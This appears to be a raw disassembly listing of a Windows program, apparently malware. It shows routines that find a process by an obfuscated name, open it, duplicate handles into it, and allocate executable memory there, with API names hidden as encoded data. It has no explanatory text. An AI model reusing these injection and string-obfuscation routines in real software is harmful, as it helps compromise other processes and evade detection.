loc_40A06B:				; CODE XREF: sub_409F94+D3j
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-8]
		add	eax, eax
		mov	edx, [ebp+arg_4]
		mov	edx, [edx-4]
		mov	edx, [edx]
		lea	eax, [edx+eax*8+0Ch]
		mov	edx, ebx
		call	sub_403F0C
		test	ebx, ebx
		jle	short loc_40A0A7
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-8]
		add	eax, eax
		mov	edx, [ebp+arg_4]
		mov	edx, [edx-4]
		mov	edx, [edx]
		mov	edx, [edx+eax*8+0Ch]
		mov	eax, esi
		mov	ecx, ebx
		call	sub_402664

loc_40A0A7:				; CODE XREF: sub_409F94+F4j
		mov	eax, [ebp+arg_4]
		inc	dword ptr [eax-8]
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40A0CA

loc_40A0BA:				; CODE XREF: sub_409F94+134j
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40A0C3:				; DATA XREF: sub_409F94+1Co
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40A0BA
; ---------------------------------------------------------------------------

loc_40A0CA:				; CODE XREF: sub_409F94+12Ej
					; DATA XREF: sub_409F94+121o
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_409F94	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40A0D4	proc near		; CODE XREF: sub_40A478+56p
					; sub_40A57C+3Fp

var_150		= dword	ptr -150h
var_14C		= dword	ptr -14Ch
var_148		= dword	ptr -148h
var_144		= dword	ptr -144h
var_140		= dword	ptr -140h
lpLibFileName	= dword	ptr -13Ch
var_138		= dword	ptr -138h
var_130		= dword	ptr -130h
var_114		= byte ptr -114h
var_10		= dword	ptr -10h
hObject		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFEB0h
		push	ebx
		push	esi
		push	edi
		xor	edx, edx
		mov	[ebp+var_150], edx
		mov	[ebp+var_14C], edx
		mov	[ebp+var_148], edx
		mov	[ebp+var_144], edx
		mov	[ebp+lpLibFileName], edx
		mov	[ebp+var_140], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40A3F7
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		mov	edx, off_409DA8
		call	sub_404724
		xor	eax, eax
		mov	[ebp+var_8], eax
		call	GetVersion_0
		test	eax, 80000000h
		jnz	loc_40A33D
		cmp	ds:dword_41693C, 0FFFFFFFFh
		jnz	short loc_40A1AC
		lea	edx, [ebp+var_140]
		mov	eax, offset dword_40A410
		call	sub_4064CC
		mov	eax, [ebp+var_140]
		lea	ecx, [ebp+lpLibFileName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpLibFileName]
		push	eax		; lpLibFileName
		call	LoadLibraryW
		mov	ds:dword_41693C, eax
		cmp	ds:dword_41693C, 0
		jz	short loc_40A1AC
		xor	eax, eax
		mov	ds:dword_41696C, eax
		lea	edx, [ebp+var_144]
		mov	eax, offset dword_40A428
		call	sub_4064CC
		mov	edx, [ebp+var_144]
		mov	eax, ds:dword_41693C
		call	sub_406960
		mov	ds:dword_416970, eax

loc_40A1AC:				; CODE XREF: sub_40A0D4+6Dj
					; sub_40A0D4+AAj
		cmp	ds:dword_41696C, 0
		jz	loc_40A24A
		lea	eax, [ebp+hObject]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		push	1
		push	0
		push	0
		call	ds:dword_41696C
		test	eax, eax
		jz	short loc_40A24A
		cmp	[ebp+hObject], 0
		jbe	short loc_40A24A
		mov	esi, [ebp+var_10]
		mov	ebx, [ebp+hObject]
		test	ebx, ebx
		jbe	short loc_40A23E

loc_40A1E1:				; CODE XREF: sub_40A0D4+168j
		mov	eax, [ebp+var_10]
		mov	edi, [eax+8]
		test	edi, edi
		jz	short loc_40A219
		push	ebp
		mov	eax, [ebp+var_10]
		mov	eax, [eax+0Ch]
		push	eax		; pSid
		lea	edx, [ebp+var_148]
		mov	eax, edi
		call	sub_4065DC
		mov	ecx, [ebp+var_148]
		mov	eax, [ebp+var_10]
		mov	edx, [eax]
		mov	eax, [ebp+var_10]
		mov	eax, [eax+4]
		call	sub_409F94
		pop	ecx
		jmp	short loc_40A237
; ---------------------------------------------------------------------------

loc_40A219:				; CODE XREF: sub_40A0D4+115j
		push	ebp
		mov	eax, [ebp+var_10]
		mov	eax, [eax+0Ch]
		push	eax		; pSid
		mov	eax, [ebp+var_10]
		mov	edx, [eax]
		mov	eax, [ebp+var_10]
		mov	eax, [eax+4]
		mov	ecx, offset aSystemProcess ; "[System Process]"
		call	sub_409F94
		pop	ecx

loc_40A237:				; CODE XREF: sub_40A0D4+143j
		add	[ebp+var_10], 10h
		dec	ebx
		jnz	short loc_40A1E1

loc_40A23E:				; CODE XREF: sub_40A0D4+10Bj
		push	esi
		call	ds:dword_416970
		jmp	loc_40A3BF
; ---------------------------------------------------------------------------

loc_40A24A:				; CODE XREF: sub_40A0D4+DFj
					; sub_40A0D4+FBj ...
		cmp	ds:dword_416968, 0
		jnz	short loc_40A262
		mov	eax, offset dword_40A45C
		call	sub_409978
		mov	ds:dword_416968, eax

loc_40A262:				; CODE XREF: sub_40A0D4+17Dj
		xor	eax, eax
		mov	[ebp+hObject], eax
		lea	eax, [ebp+hObject]
		push	eax
		push	0
		push	0
		push	5
		call	ds:dword_416968
		xor	esi, esi
		cmp	[ebp+hObject], 0
		jnz	short loc_40A2BF
		mov	[ebp+hObject], 10000h

loc_40A286:				; CODE XREF: sub_40A0D4+1E7j
		mov	eax, [ebp+hObject]
		add	eax, eax
		mov	[ebp+hObject], eax
		push	esi		; hMem
		call	LocalFree_1
		mov	eax, [ebp+hObject]
		push	eax		; uBytes
		push	40h		; uFlags
		call	LocalAlloc_1
		mov	esi, eax
		push	0
		mov	eax, [ebp+hObject]
		push	eax
		push	esi
		push	5
		call	ds:dword_416968
		test	eax, eax
		jz	short loc_40A2E3
		cmp	[ebp+hObject], 400000h
		jnz	short loc_40A286
		jmp	short loc_40A2E3
; ---------------------------------------------------------------------------

loc_40A2BF:				; CODE XREF: sub_40A0D4+1A9j
		mov	eax, [ebp+hObject]
		add	eax, eax
		mov	[ebp+hObject], eax
		mov	eax, [ebp+hObject]
		push	eax		; uBytes
		push	40h		; uFlags
		call	LocalAlloc_1
		mov	esi, eax
		push	0
		mov	eax, [ebp+hObject]
		push	eax
		push	esi
		push	5
		call	ds:dword_416968

loc_40A2E3:				; CODE XREF: sub_40A0D4+1DEj
					; sub_40A0D4+1E9j
		test	eax, eax
		jnz	short loc_40A332
		mov	ebx, esi

loc_40A2E9:				; CODE XREF: sub_40A0D4+25Cj
		mov	edi, [ebx+3Ch]
		test	edi, edi
		jz	short loc_40A314
		push	ebp
		push	0		; pSid
		lea	edx, [ebp+var_14C]
		mov	eax, edi
		call	sub_4065DC
		mov	ecx, [ebp+var_14C]
		mov	edx, [ebx+50h]
		mov	eax, [ebx+44h]
		call	sub_409F94
		pop	ecx
		jmp	short loc_40A328
; ---------------------------------------------------------------------------

loc_40A314:				; CODE XREF: sub_40A0D4+21Aj
		push	ebp
		push	0		; pSid
		mov	ecx, offset aSystemProcess ; "[System Process]"
		mov	edx, [ebx+50h]
		mov	eax, [ebx+44h]
		call	sub_409F94
		pop	ecx

loc_40A328:				; CODE XREF: sub_40A0D4+23Ej
		mov	eax, [ebx]
		test	eax, eax
		jz	short loc_40A332
		add	ebx, eax
		jmp	short loc_40A2E9
; ---------------------------------------------------------------------------

loc_40A332:				; CODE XREF: sub_40A0D4+211j
					; sub_40A0D4+258j
		push	esi		; hMem
		call	LocalFree_1
		jmp	loc_40A3BF
; ---------------------------------------------------------------------------

loc_40A33D:				; CODE XREF: sub_40A0D4+60j
		call	sub_409DD4
		push	0
		push	2
		call	ds:dword_416938
		mov	[ebp+hObject], eax
		cmp	[ebp+hObject], 0FFFFFFFFh
		jz	short loc_40A3BF
		mov	[ebp+var_138], 128h
		lea	eax, [ebp+var_138]
		push	eax
		mov	eax, [ebp+hObject]
		push	eax
		call	ds:dword_416928
		test	eax, eax
		jz	short loc_40A3B6

loc_40A374:				; CODE XREF: sub_40A0D4+2E0j
		push	ebp
		push	0		; pSid
		lea	eax, [ebp+var_150]
		lea	edx, [ebp+var_114]
		mov	ecx, 104h
		call	sub_403BF8
		mov	ecx, [ebp+var_150]
		xor	edx, edx
		mov	eax, [ebp+var_130]
		call	sub_409F94
		pop	ecx
		lea	eax, [ebp+var_138]
		push	eax
		mov	eax, [ebp+hObject]
		push	eax
		call	ds:dword_41692C
		test	eax, eax
		jnz	short loc_40A374

loc_40A3B6:				; CODE XREF: sub_40A0D4+29Ej
		mov	eax, [ebp+hObject]
		push	eax		; hObject
		call	CloseHandle

loc_40A3BF:				; CODE XREF: sub_40A0D4+171j
					; sub_40A0D4+264j ...
		mov	eax, [ebp+var_8]
		push	eax
		mov	eax, [ebp+var_4]
		mov	ecx, 1
		mov	edx, off_409DA8
		call	sub_404718
		add	esp, 4
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40A3FE

loc_40A3E6:				; CODE XREF: sub_40A0D4+328j
		lea	eax, [ebp+var_150]
		mov	edx, 6
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40A3F7:				; DATA XREF: sub_40A0D4+38o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40A3E6
; ---------------------------------------------------------------------------

loc_40A3FE:				; CODE XREF: sub_40A0D4+322j
					; DATA XREF: sub_40A0D4+30Do
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40A0D4	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Ch
dword_40A410	dd 14262102h, 67663C25h, 3939317Bh, 0 ;	DATA XREF: sub_40A0D4+75o
		dd 0FFFFFFFFh, 0Dh
dword_40A428	dd 13060102h, 18303027h, 273A3830h, 2Ch, 0FFFFFFFFh, 10h
					; DATA XREF: sub_40A0D4+B9o
aSystemProcess	db '[System Process]',0 ; DATA XREF: sub_40A0D4+158o
					; sub_40A0D4+243o
		align 4
		dd 0FFFFFFFFh, 18h
dword_40A45C	dd 2004211Bh, 62C2730h,	3021262Ch, 333B1C38h, 3438273Ah
					; DATA XREF: sub_40A0D4+17Fo
		dd 3B3A3C21h, 0

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40A478	proc near		; CODE XREF: sub_40A660:loc_40A67Fp
					; sub_40DEDC:loc_40DF67p

var_110		= dword	ptr -110h
Filename	= byte ptr -109h
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFEF0h
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		mov	[ebp+var_110], eax
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40A56A
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+var_4]
		mov	edx, off_409DA8
		call	sub_404724
		cmp	ds:dwProcessId,	0
		jnz	short loc_40A525
		push	104h		; nSize
		lea	eax, [ebp+Filename]
		push	eax		; lpFilename
		call	sub_4097D4
		push	eax		; hModule
		call	GetModuleFileNameA_0
		lea	eax, [ebp+var_4]
		call	sub_40A0D4
		mov	eax, [ebp+var_4]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_40A525
		inc	esi
		xor	ebx, ebx

loc_40A4E4:				; CODE XREF: sub_40A478+ABj
		lea	eax, [ebp+var_110]
		lea	edx, [ebp+Filename]
		mov	ecx, 105h
		call	sub_403BF8
		mov	edx, [ebp+var_110]
		mov	edi, ebx
		add	edi, edi
		mov	eax, [ebp+var_4]
		mov	eax, [eax+edi*8+4]
		call	sub_4059C4
		test	al, al
		jz	short loc_40A521
		mov	eax, [ebp+var_4]
		mov	eax, [eax+edi*8]
		mov	ds:dwProcessId,	eax
		jmp	short loc_40A525
; ---------------------------------------------------------------------------

loc_40A521:				; CODE XREF: sub_40A478+9Aj
		inc	ebx
		dec	esi
		jnz	short loc_40A4E4

loc_40A525:				; CODE XREF: sub_40A478+3Aj
					; sub_40A478+67j ...
		cmp	ds:dwProcessId,	0
		jz	short loc_40A541
		mov	eax, ds:dwProcessId
		push	eax		; dwProcessId
		push	0		; bInheritHandle
		push	40h		; dwDesiredAccess
		call	OpenProcess
		mov	ebx, eax
		jmp	short loc_40A543
; ---------------------------------------------------------------------------

loc_40A541:				; CODE XREF: sub_40A478+B4j
		xor	ebx, ebx

loc_40A543:				; CODE XREF: sub_40A478+C7j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40A571

loc_40A550:				; CODE XREF: sub_40A478+F7j
		lea	eax, [ebp+var_110]
		call	sub_403994
		lea	eax, [ebp+var_4]
		mov	edx, off_409DA8
		call	sub_404724
		retn
; ---------------------------------------------------------------------------

loc_40A56A:				; DATA XREF: sub_40A478+1Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40A550
; ---------------------------------------------------------------------------

loc_40A571:				; CODE XREF: sub_40A478+F1j
					; DATA XREF: sub_40A478+D3o
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40A478	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40A57C	proc near		; CODE XREF: sub_40A660+16p

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		push	ebp
		push	offset loc_40A63B
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	eax, [ebp+var_4]
		mov	edx, off_409DA8
		call	sub_404724
		cmp	ds:dword_416978, 0
		jnz	short loc_40A5F9
		lea	edx, [ebp+var_8]
		mov	eax, offset dword_40A654
		call	sub_4064CC
		lea	eax, [ebp+var_4]
		call	sub_40A0D4
		mov	eax, [ebp+var_4]
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_40A5F9
		inc	esi
		xor	ebx, ebx

loc_40A5D1:				; CODE XREF: sub_40A57C+7Bj
		mov	edi, ebx
		add	edi, edi
		mov	eax, [ebp+var_4]
		mov	eax, [eax+edi*8+4]
		mov	edx, [ebp+var_8]
		call	sub_4059C4
		test	al, al
		jz	short loc_40A5F5
		mov	eax, [ebp+var_4]
		mov	eax, [eax+edi*8]
		mov	ds:dword_416978, eax
		jmp	short loc_40A5F9
; ---------------------------------------------------------------------------

loc_40A5F5:				; CODE XREF: sub_40A57C+6Aj
		inc	ebx
		dec	esi
		jnz	short loc_40A5D1

loc_40A5F9:				; CODE XREF: sub_40A57C+2Dj
					; sub_40A57C+50j ...
		cmp	ds:dword_416978, 0
		jz	short loc_40A615
		mov	eax, ds:dword_416978
		push	eax		; dwProcessId
		push	0		; bInheritHandle
		push	40h		; dwDesiredAccess
		call	OpenProcess
		mov	ebx, eax
		jmp	short loc_40A617
; ---------------------------------------------------------------------------

loc_40A615:				; CODE XREF: sub_40A57C+84j
		xor	ebx, ebx

loc_40A617:				; CODE XREF: sub_40A57C+97j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40A642

loc_40A624:				; CODE XREF: sub_40A57C+C4j
		lea	eax, [ebp+var_8]
		call	sub_403994
		lea	eax, [ebp+var_4]
		mov	edx, off_409DA8
		call	sub_404724
		retn
; ---------------------------------------------------------------------------

loc_40A63B:				; DATA XREF: sub_40A57C+Do
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40A624
; ---------------------------------------------------------------------------

loc_40A642:				; CODE XREF: sub_40A57C+BEj
					; DATA XREF: sub_40A57C+A3o
		mov	eax, ebx
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_40A57C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 8
dword_40A654	dd 6061806h, 302D307Bh,	0 ; DATA XREF: sub_40A57C+32o

; =============== S U B	R O U T	I N E =======================================


sub_40A660	proc near		; CODE XREF: sub_40AF50+1CFp
					; sub_40CD78+140p ...

TargetHandle	= dword	ptr -0Ch

		push	ebx
		push	esi
		push	ecx
		mov	esi, eax
		xor	eax, eax
		mov	[esp+0Ch+TargetHandle],	eax
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40A67F
		call	sub_40A57C
		mov	ebx, eax
		jmp	short loc_40A686
; ---------------------------------------------------------------------------

loc_40A67F:				; CODE XREF: sub_40A660+14j
		call	sub_40A478
		mov	ebx, eax

loc_40A686:				; CODE XREF: sub_40A660+1Dj
		test	ebx, ebx
		jz	short loc_40A6A8
		push	2		; dwOptions
		push	0		; bInheritHandle
		push	0		; dwDesiredAccess
		lea	eax, [esp+18h+TargetHandle]
		push	eax		; lpTargetHandle
		push	ebx		; hTargetProcessHandle
		push	esi		; hSourceHandle
		call	GetCurrentProcess
		push	eax		; hSourceProcessHandle
		call	DuplicateHandle
		push	ebx		; hObject
		call	CloseHandle

loc_40A6A8:				; CODE XREF: sub_40A660+28j
		mov	eax, [esp+0Ch+TargetHandle]
		pop	edx
		pop	esi
		pop	ebx
		retn
sub_40A660	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40A6B0	proc near		; CODE XREF: sub_40A770+D0p
					; sub_40A890+4Fp ...

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0
		push	ebx
		push	esi
		push	edi
		mov	edi, edx
		mov	esi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_40A74A
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	ds:dword_41694C, 0
		jnz	short loc_40A71E
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40A71E
		lea	edx, [ebp+var_4]
		mov	eax, offset dword_40A760
		call	sub_4064CC
		mov	eax, [ebp+var_4]
		call	sub_403E24
		push	eax		; lpLibFileName
		call	LoadLibraryA
		mov	ebx, eax
		mov	edx, 47h
		mov	eax, ebx
		call	sub_406B50
		mov	ds:dword_41694C, eax
		mov	edx, 49h
		mov	eax, ebx
		call	sub_406B50
		mov	ds:dword_416950, eax

loc_40A71E:				; CODE XREF: sub_40A6B0+21j
					; sub_40A6B0+2Dj
		test	esi, esi
		jz	short loc_40A729
		mov	eax, ds:dword_41694C
		mov	[esi], eax

loc_40A729:				; CODE XREF: sub_40A6B0+70j
		test	edi, edi
		jz	short loc_40A734
		mov	eax, ds:dword_416950
		mov	[edi], eax

loc_40A734:				; CODE XREF: sub_40A6B0+7Bj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40A751

loc_40A741:				; CODE XREF: sub_40A6B0+9Fj
		lea	eax, [ebp+var_4]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40A74A:				; DATA XREF: sub_40A6B0+Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40A741
; ---------------------------------------------------------------------------

loc_40A751:				; CODE XREF: sub_40A6B0+99j
					; DATA XREF: sub_40A6B0+8Co
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40A6B0	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Ch
dword_40A760	dd 36383A36h, 67663921h, 3939317Bh, 0 ;	DATA XREF: sub_40A6B0+32o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40A770	proc near		; CODE XREF: sub_40AB44+A3p
					; sub_40B410+2C9p ...

var_1C		= dword	ptr -1Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE4h
		push	ebx
		push	esi
		push	edi
		mov	esi, [ebp+arg_4]
		cmp	[ebp+arg_0], 0
		jbe	loc_40A853
		call	GetVersion_0
		test	eax, 80000000h
		jnz	loc_40A83C
		xor	edi, edi
		cmp	ds:dword_416940, 0
		jnz	short loc_40A7BF
		mov	eax, offset dword_40A868
		call	sub_409880
		mov	ds:dword_416940, eax
		mov	eax, offset dword_40A880
		call	sub_409880
		mov	ds:dword_416948, eax

loc_40A7BF:				; CODE XREF: sub_40A770+2Fj
		test	esi, esi
		jnz	short loc_40A7CA
		call	GetCurrentProcess
		mov	esi, eax

loc_40A7CA:				; CODE XREF: sub_40A770+51j
		mov	ebx, 5F000000h
		jmp	short loc_40A812
; ---------------------------------------------------------------------------

loc_40A7D1:				; CODE XREF: sub_40A770+B3j
		cmp	[ebp+var_C], 10000h
		jnz	short loc_40A7F4
		push	40h
		push	2000h
		mov	eax, [ebp+arg_0]
		push	eax
		mov	eax, [ebp+var_1C]
		push	eax
		push	esi
		call	ds:dword_416940
		mov	edi, eax
		jmp	short loc_40A825
; ---------------------------------------------------------------------------

loc_40A7F4:				; CODE XREF: sub_40A770+68j
		cmp	[ebp+var_10], 10000h
		jnb	short loc_40A806
		mov	[ebp+var_10], 10000h
		jmp	short loc_40A80D
; ---------------------------------------------------------------------------

loc_40A806:				; CODE XREF: sub_40A770+8Bj
		and	[ebp+var_10], 0FFFF0000h

loc_40A80D:				; CODE XREF: sub_40A770+94j
		mov	eax, [ebp+var_10]
		add	ebx, eax

loc_40A812:				; CODE XREF: sub_40A770+5Fj
		push	1Ch
		lea	eax, [ebp+var_1C]
		push	eax
		push	ebx
		push	esi
		call	ds:dword_416948
		cmp	eax, 1Ch
		jz	short loc_40A7D1

loc_40A825:				; CODE XREF: sub_40A770+82j
		push	40h
		push	1000h
		mov	eax, [ebp+arg_0]
		push	eax
		push	edi
		push	esi
		call	ds:dword_416940
		mov	edi, eax
		jmp	short loc_40A855
; ---------------------------------------------------------------------------

loc_40A83C:				; CODE XREF: sub_40A770+20j
		xor	edx, edx
		xor	eax, eax
		call	sub_40A6B0
		mov	eax, [ebp+arg_0]
		push	eax
		call	ds:dword_41694C
		mov	edi, eax
		jmp	short loc_40A855
; ---------------------------------------------------------------------------

loc_40A853:				; CODE XREF: sub_40A770+10j
		xor	edi, edi

loc_40A855:				; CODE XREF: sub_40A770+CAj
					; sub_40A770+E1j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	8
sub_40A770	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 0Eh
dword_40A868	dd 21273C03h, 14393420h, 363A3939h, 2D10h, 0FFFFFFFFh
					; DATA XREF: sub_40A770+31o
		dd 0Eh
dword_40A880	dd 21273C03h, 4393420h,	2C273020h, 2D10h ; DATA	XREF: sub_40A770+40o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40A890	proc near		; CODE XREF: sub_40B410+454p
					; sub_40B410+46Cp ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		mov	esi, [ebp+arg_4]
		mov	ebx, [ebp+arg_0]
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40A8DB
		cmp	ds:dword_416944, 0
		jnz	short loc_40A8BF
		mov	eax, offset dword_40A910
		call	sub_409880
		mov	ds:dword_416944, eax

loc_40A8BF:				; CODE XREF: sub_40A890+1Ej
		test	esi, esi
		jnz	short loc_40A8CA
		call	GetCurrentProcess
		mov	esi, eax

loc_40A8CA:				; CODE XREF: sub_40A890+31j
		push	8000h
		push	0
		push	ebx
		push	esi
		call	ds:dword_416944
		jmp	short loc_40A901
; ---------------------------------------------------------------------------

loc_40A8DB:				; CODE XREF: sub_40A890+15j
		xor	edx, edx
		xor	eax, eax
		call	sub_40A6B0
		cmp	ebx, 80000000h
		jb	short loc_40A8F7
		push	ebx
		call	ds:dword_416950
		test	eax, eax
		jnz	short loc_40A8FB

loc_40A8F7:				; CODE XREF: sub_40A890+5Aj
		xor	eax, eax
		jmp	short loc_40A8FD
; ---------------------------------------------------------------------------

loc_40A8FB:				; CODE XREF: sub_40A890+65j
		mov	al, 1

loc_40A8FD:				; CODE XREF: sub_40A890+69j
		neg	al
		sbb	eax, eax

loc_40A901:				; CODE XREF: sub_40A890+49j
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
sub_40A890	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Dh
dword_40A910	dd 21273C03h, 13393420h, 10303027h, 2Dh	; DATA XREF: sub_40A890+20o

; =============== S U B	R O U T	I N E =======================================


sub_40A920	proc near		; CODE XREF: sub_40F0A4+7Bp
		push	ebx
		call	sub_4097D4
		mov	ebx, eax
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_40A94E
		cmp	ds:dword_41697C, 0
		jnz	short loc_40A94E
		mov	edx, 1
		mov	eax, ebx
		call	sub_406B50
		mov	ds:dword_41697C, eax

loc_40A94E:				; CODE XREF: sub_40A920+12j
					; sub_40A920+1Bj
		cmp	ds:dword_416980, 0
		jnz	short loc_40A984
		mov	eax, offset dword_40A990
		call	sub_409880
		mov	ds:dword_416980, eax
		mov	eax, offset dword_40A9A8
		call	sub_409880
		mov	ds:dword_416984, eax
		mov	eax, offset dword_40A9C0
		call	sub_409880
		mov	ds:dword_416988, eax

loc_40A984:				; CODE XREF: sub_40A920+35j
		pop	ebx
		retn
sub_40A920	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Eh
dword_40A990	dd 21273C03h, 5393420h,	30213A27h, 2136h, 0FFFFFFFFh, 0Dh
					; DATA XREF: sub_40A920+37o
dword_40A9A8	dd 3417261Ch, 3C270231h, 21053021h, 27h, 0FFFFFFFFh, 0Ah
					; DATA XREF: sub_40A920+46o
dword_40A9C0	dd 3213012h, 3C262730h,	3B3Ah ;	DATA XREF: sub_40A920+55o

; =============== S U B	R O U T	I N E =======================================


sub_40A9CC	proc near		; CODE XREF: sub_40CB00+6Fp
					; sub_40CD20+20p ...

Buffer		= _MEMORY_BASIC_INFORMATION ptr	-24h

		push	ebx
		push	esi
		add	esp, 0FFFFFFE4h
		mov	esi, eax
		push	1Ch		; dwLength
		lea	eax, [esp+28h+Buffer]
		push	eax		; lpBuffer
		push	esi		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	short loc_40AA01
		mov	ebx, [esp+24h+Buffer.Protect]
		test	bl, 40h
		jnz	short loc_40A9FD
		test	bl, 80h
		jnz	short loc_40A9FD
		test	bl, 4
		jnz	short loc_40A9FD
		test	bl, 8
		jz	short loc_40AA01

loc_40A9FD:				; CODE XREF: sub_40A9CC+20j
					; sub_40A9CC+25j ...
		xor	eax, eax
		jmp	short loc_40AA03
; ---------------------------------------------------------------------------

loc_40AA01:				; CODE XREF: sub_40A9CC+17j
					; sub_40A9CC+2Fj
		mov	al, 1

loc_40AA03:				; CODE XREF: sub_40A9CC+33j
		add	esp, 1Ch
		pop	esi
		pop	ebx
		retn
sub_40A9CC	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40AA0C	proc near		; CODE XREF: sub_40AAAC+2p
					; sub_40CBCC+5Ep
					; DATA XREF: ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+arg_0]
		push	0
		push	esp
		push	40h
		push	ecx
		push	edx
		call	ds:dword_416980
		pop	ecx
		cmp	eax, 0
		jz	short loc_40AA3B
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+arg_0]
		push	ecx
		push	edx
		call	ds:dword_416984
		cmp	eax, 0
		jz	short loc_40AA9F

loc_40AA3B:				; CODE XREF: sub_40AA0C+1Aj
		call	ds:dword_416988
		and	eax, 80000000h
		cmp	eax, 0
		jz	short loc_40AAA4
		mov	eax, [ebp+arg_0]
		and	eax, 80000000h
		cmp	eax, 0
		jz	short loc_40AAA4
		mov	eax, [ebp+arg_0]
		and	eax, 0FFFh
		add	eax, [ebp+arg_4]
		add	eax, 0FFFh
		shr	eax, 0Ch
		push	20060000h
		push	0FFFFFFFFh
		push	eax
		mov	eax, [ebp+arg_0]
		shr	eax, 0Ch
		push	eax
		push	1000Dh
		call	ds:dword_41697C
		mov	ecx, [ebp+arg_4]
		mov	edx, [ebp+arg_0]
		push	ecx
		push	edx
		call	ds:dword_416984
		cmp	eax, 0
		jz	short loc_40AA9F
		xor	eax, eax
		jmp	short loc_40AAA4
; ---------------------------------------------------------------------------

loc_40AA9F:				; CODE XREF: sub_40AA0C+2Dj
					; sub_40AA0C+8Dj
		mov	eax, 1

loc_40AAA4:				; CODE XREF: sub_40AA0C+3Dj
					; sub_40AA0C+4Aj ...
		pop	ebp
		retn	8
sub_40AA0C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40AAAC	proc near		; CODE XREF: sub_40CB00+7Fp
					; sub_40CD20+2Fp ...
		push	edx
		push	eax
		call	sub_40AA0C
		retn
sub_40AAAC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

